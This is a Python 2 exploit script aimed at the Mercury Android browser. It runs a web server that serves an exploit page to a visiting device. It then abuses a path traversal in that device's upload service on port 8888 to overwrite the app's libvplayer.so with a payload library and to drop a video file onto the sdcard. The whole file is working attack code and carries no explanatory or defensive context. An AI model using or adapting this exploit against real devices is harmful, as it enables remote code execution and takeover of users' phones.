import time
import requests
import SocketServer
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

global request_counter
class WebServer(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        f = open('exploit.html','r')
        content = f.read()
        f.close()
        self.wfile.write(content)
        self.exploit()
        
    def exploit(self):
        time.sleep(1)
        self.send_mp4file()
        self.send_fake_library()
       
    def send_mp4file(self):
        print "[#] Sending MP4File"
        uri = 'http://'+self.client_address[0]+':'+str(8888)+"/doupload?dir=../../../../../../../sdcard/Mercury/Downloads/&id=d677a3fa-d21d-4c7f-9cb3-e9c8ab72203b"
        headers={
            "Content-Type": "multipart/form-data; boundary=---------------------------8579684710260803921039462934", 
            "Content-Length": str(len(self.read_mp4file())), 
            "Referer": "http://"+self.client_address[0]+":"+str(8888)+"/", 
        }
        data = """-----------------------------8579684710260803921039462934\r\n
        Content-Disposition: form-data; name=\"Download/\"; filename=\"video.mp4\"\r\n
        Content-Type: application/octet-stream\r\n\r\n"""+self.read_mp4file()+"""\r\n\r\n-----------------------------8579684710260803921039462934--\r\n"""
        r = requests.post(uri, headers=headers, data=data)
        print r

    def send_fake_library(self):
        print "[#] Sending Exploit Library"
        uri = 'http://'+self.client_address[0]+':'+str(8888)+"/doupload?dir=../../../../../../../data/data/com.ilegendsoft.mercury/libs/&id=d677a3fa-d21d-4c7f-9cb3-e9c8ab72203b"
        headers={
            "Content-Type": "multipart/form-data; boundary=---------------------------8579684710260803921039462934", 
            "Content-Length": str(len(self.read_fakelib())), 
            "Referer": "http://"+self.client_address[0]+":"+str(8888)+"/", 
        }
        data = """-----------------------------8579684710260803921039462934\r\n
        Content-Disposition: form-data; name=\"Download/\"; filename=\"libvplayer.so\"\r\n
        Content-Type: application/octet-stream\r\n\r\n"""+self.read_fakelib()+"""\r\n\r\n-----------------------------8579684710260803921039462934--\r\n"""
        r = requests.post(uri, headers=headers, data=data)
        print r

    def read_mp4file(self):
        f = open("./video/video.mp4", "rb")
        mp4_content = f.read()
        f.close()
        return mp4_content

    def read_fakelib(self):
        f = open("./fake_lib/libpayload.so", "rb")
        exploit_code = f.read()
        f.close()
        return exploit_code

     